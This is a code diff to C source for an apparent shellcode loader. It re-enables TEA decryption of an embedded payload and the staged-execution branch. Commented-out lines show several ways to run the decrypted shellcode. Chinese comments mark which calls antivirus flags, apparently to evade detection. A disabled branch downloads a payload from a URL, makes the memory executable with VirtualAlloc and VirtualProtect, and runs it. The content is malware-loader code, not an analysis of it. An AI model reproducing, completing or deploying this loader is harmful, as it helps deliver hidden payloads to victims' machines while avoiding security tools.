@@ -211,12 +211,12 @@ int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned i
 	}
 	else if (encData[0] == H_ENC_TEA)
 	{
-		//int encdatasize = *(unsigned int*)(encData + 1 + 16);
-		////TEA加密
-		//tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1) , &config->shellcode, (unsigned int*)&config->shellcodeSize);
-		//if (config->shellcode == NULL) {
-		//	return -1;
-		//}
+		int encdatasize = *(unsigned int*)(encData + 1 + 16);
+		//TEA加密
+		tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1) , &config->shellcode, (unsigned int*)&config->shellcodeSize);
+		if (config->shellcode == NULL) {
+			return -1;
+		}
 	}
 	else
 		return -1;
@@ -257,58 +257,58 @@ int RunSCFromFile(const char *file,struct ConfigurationData* config)
 	if (GetSCPointerFromFile(file ,config, &encData, &encDataSize) == 0)
 	{
 		//解密SC
-		//if (DecryptSC(config, encData, &encDataSize) == 0)
-		//{
-		//	free(encData);
-		//	encData = 0;
-		//	if (config->shellcode[0] == P_TYPE_STAGE)
-		//	{
-		//		//设置跳转代码
-		//		int amtWritten = (1 + sizeof(DWORD));
-		//		DWORD jumpOffset = 5;
-		//		jumpOffset -= amtWritten;
-		//		{
-		//			//赋值0xe9
-		//			//*encData = 0xA1;
-		//			//*encData ^= 0x48;
-		//		}
+		if (DecryptSC(config, encData, &encDataSize) == 0)
+		{
+			free(encData);
+			encData = 0;
+			if (config->shellcode[0] == P_TYPE_STAGE)
+			{
+				//设置跳转代码
+				int amtWritten = (1 + sizeof(DWORD));
+				DWORD jumpOffset = 5;
+				jumpOffset -= amtWritten;
+				{
+					//赋值0xe9
+					//*encData = 0xA1;
+					//*encData ^= 0x48;
+				}
 
-		//		//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
-		//		//*jumpTarget = jumpOffset;
+				//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
+				//*jumpTarget = jumpOffset;
 
-		//		////执行shellcode代码
-		//		//void_func_ptr callLoc = (void_func_ptr)(encData);
-		//		//callLoc();//函数调用报毒
-		//		//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
-		//		//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
-		//		//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
-		//	}
-		//	else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
-		//	{
-		//		//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
-		//		//unsigned char* url = malloc(urllen + 1);
-		//		//if (url)
-		//		//{
-		//		//	//解析url
-		//		//	memset(url, 0, urllen + 1);
-		//		//	memcpy(url, config->shellcode + 1 + 4, urllen);
-		//		//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
-		//		//	free(url);
-		//		//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		//		//	if (dwBaseAddr)
-		//		//	{
-		//		//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
-		//		//		free(config->shellcode);
-		//		//		DWORD oldpro = PAGE_READWRITE;
-		//		//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
-		//		//			((void(*)())dwBaseAddr)();
-		//		//	}
-		//		//}
-		//		//else
-		//		//	return -1;
-		//	}
-		//	return 0;
-		//}
+				////执行shellcode代码
+				//void_func_ptr callLoc = (void_func_ptr)(encData);
+				//callLoc();//函数调用报毒
+				//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
+				//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
+				//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
+			}
+			else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
+			{
+				//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
+				//unsigned char* url = malloc(urllen + 1);
+				//if (url)
+				//{
+				//	//解析url
+				//	memset(url, 0, urllen + 1);
+				//	memcpy(url, config->shellcode + 1 + 4, urllen);
+				//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
+				//	free(url);
+				//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				//	if (dwBaseAddr)
+				//	{
+				//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+				//		free(config->shellcode);
+				//		DWORD oldpro = PAGE_READWRITE;
+				//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+				//			((void(*)())dwBaseAddr)();
+				//	}
+				//}
+				//else
+				//	return -1;
+			}
+			return 0;
+		}
 	}
 	return -1;
 }
